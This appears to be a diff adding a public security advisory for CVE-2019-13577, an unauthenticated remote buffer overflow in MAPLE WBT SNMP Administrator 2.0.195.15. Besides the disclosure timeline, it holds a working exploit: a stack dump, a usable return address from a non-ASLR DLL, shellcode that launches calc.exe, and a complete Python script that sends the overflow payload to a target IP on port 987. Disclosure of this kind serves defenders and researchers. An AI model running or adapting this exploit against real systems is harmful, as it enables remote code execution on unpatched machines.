@@ -1,0 +1,165 @@
+# Exploit Title: MAPLE Computer WBT SNMP Administrator 2.0.195.15 - Remote Buffer Overflow
+# Author: hyp3rlinx
+# Discovery Date: 2019-07-17
+# Vendor Homepage: www.computerlab.com
+# Software Link: https://www.computerlab.com/index.php/downloads/category/27-device-manager
+# Software Link: ftp://downloads.computerlab.com/software/SnmpSetup.195.15.EXE
+# Tested on OS: Windows
+# CVE: CVE-2019-13577
+
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MAPLE-WBT-SNMP-ADMINISTRATOR-v2.0.195.15-REMOTE-BUFFER-OVERFLOW-CODE-EXECUTION-0DAY.txt
+[+] ISR: Apparition Security        
+ 
+
+[Vendor]
+www.computerlab.com
+
+
+[Product]
+MAPLE Computer WBT SNMP Administrator (Thin Client Administrator)
+v2.0.195.15
+
+https://www.computerlab.com/index.php/downloads/category/27-device-manager
+ftp://downloads.computerlab.com/software/SnmpSetup.195.15.EXE
+SnmpSetup.195.15.EXE - MD5 Hash: a3913aae166c11ddd21dca437e78c3f4
+
+The CLI Thin Client Manager is designed to provide remote management and control of CLI Thin Clients.
+This software is built on the TCP/IP industry standard SNMP (Simple Network Communication Protocol).
+Agents are built into the clients for remote management and configuration.
+
+
+[Vulnerability Type]
+Unauthenticated Remote Buffer Overflow Code Execution 0day
+
+
+[CVE Reference]
+CVE-2019-13577
+
+
+[Security Issue]
+SnmpAdm.exe in MAPLE WBT SNMP Administrator v2.0.195.15 has an Unauthenticated Remote Buffer Overflow via a long string to the CE Remote feature listening on Port 987.
+This will overwrite data on the stack/registers and allow for control of the programs execution flow resulting in attacker supplied remote code execution.
+Authentication is not required for this exploit.
+
+This program seems to be packed using ASPack v2.12 and can be difficult to unpack because it uses self-modifying code.
+When installing the vulnerable program if asks for a serial number just enter a value of "1" or something.
+Upon launching the program if any errors occur try right click SnmpAdm.exe and run it as Admin.
+Interestingly, it seems to drop DLLs with .tmp extensions in AppData\Local\Temp directory, make OS system files viewable in explorer to see them.
+
+e.g. C:\Users\blah\AppData\Local\Temp\~ip6B92.tmp
+
+ASLR / SEH all set to False helping to make exploit more portable. 
+
+CALL EBX
+10008FB3   0x10008fb3 : call ebx | null {PAGE_EXECUTE_READ} [ipwSNMPv5.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v5.0.0.1364 (C:\Program Files (x86)\SnmpAdm\ipwSNMPv5.dll)
+
+Stack dump:
+
+EAX 41414141
+ECX 0018FEFC
+EDX 0018FF10
+EBX 022DDA78 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ESP 0018FECC
+EBP 0018FEF4
+ESI 0018FF10
+EDI 0018FEFC
+EIP 41414141
+C 0 ES 002B 32bit 0(FFFFFFFF)
+P 1 CS 0023 32bit 0(FFFFFFFF)
+A 0 SS 002B 32bit 0(FFFFFFFF)
+Z 0 DS 002B 32bit 0(FFFFFFFF)
+S 0 FS 0053 32bit 7EFDD000(FFF)
+T 0 GS 002B 32bit 0(FFFFFFFF)
+D 0
+O 0 LastErr ERROR_NO_SCROLLBARS (000005A7)
+EFL 00010206 (NO,NB,NE,A,NS,PE,GE,G)
+
+
+
+[Exploit/POC]
+from socket import *
+import struct,sys,argparse
+
+#MAPLE WBT SNMP Administrator (SnmpAdm.exe) v2.0.195.15
+#CVE-2019-13577
+#Remote Buffer Overflow 0day
+#hyp3rlinx - ApparitionSec
+
+#Pop calc.exe Windows 7 SP1
+sc=("\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B"
+"\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B"
+"\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31"
+"\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA"
+"\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14"
+"\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x65\x78\x65"
+"\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC")
+
+eip = struct.pack("<L", 0x10008fb3)      #JMP EBX
+popebx = struct.pack("<L", 0x022C0012)   #5B POP EBX
+
+buf0="B"*693704 
+buf1=eip
+buf2=popebx+sc+"R"*899+"W"*23975 
+payload=buf0+buf1+buf2
+
+def doit(IP,payload):
+    try:
+        s=socket(AF_INET, SOCK_STREAM)        
+        s.connect((IP, 987))
+        s.send(payload)
+        print "CVE-2019-13577 - WBT SNMP Administrator Buffer Overflow 0day."
+        print "hyp3rlinx"
+        s.close()
+    except Exception as e:
+        print str(e)
+
+def parse_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-i", "--ipaddress", help="IP of Target CVE-2019-13577")
+    return parser.parse_args()
+
+def main(args):
+    doit(args.ipaddress,payload)
+
+
+if __name__ == "__main__":
+    if not len(sys.argv) > 1:
+        print "[*] No args supplied see Help -h"
+        exit()
+    main(parse_args())
+
+
+
+
+
+[POC Video URL]
+https://www.youtube.com/watch?v=THMqueCIrFw
+
+
+[Network Access]
+Remote
+
+
+[Severity]
+High
+
+
+[Disclosure Timeline]
+Vendor Notification: July 10, 2019
+Second vendor notification attempt: July 13, 2019
+No vendor replies.
+July 17, 2019 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
